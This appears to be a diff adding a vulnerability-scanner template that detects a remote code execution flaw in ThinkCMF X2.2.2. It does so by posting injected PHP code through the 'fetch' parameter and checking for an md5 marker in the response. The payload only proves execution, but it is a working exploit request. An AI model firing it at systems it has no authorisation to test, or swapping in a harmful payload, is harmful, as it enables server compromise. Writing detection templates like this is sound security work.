@@ -1,0 +1,26 @@
+id: thinkcmf-x222-rce
+info:
+  name: ThinkCMF X2.2.2 Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    ThinkCMF X2.2.2 is vulnerable to remote code execution (RCE) due to improper handling of the 'fetch' parameter.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "a=fetch&content=%3C?php%20var_dump(md5(111));die();?%3Ea"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "698d51a19d8a121ce581499d7b701668"
+        part: body
+      - type: word
+        words:
+          - "(32)"
+        part: body
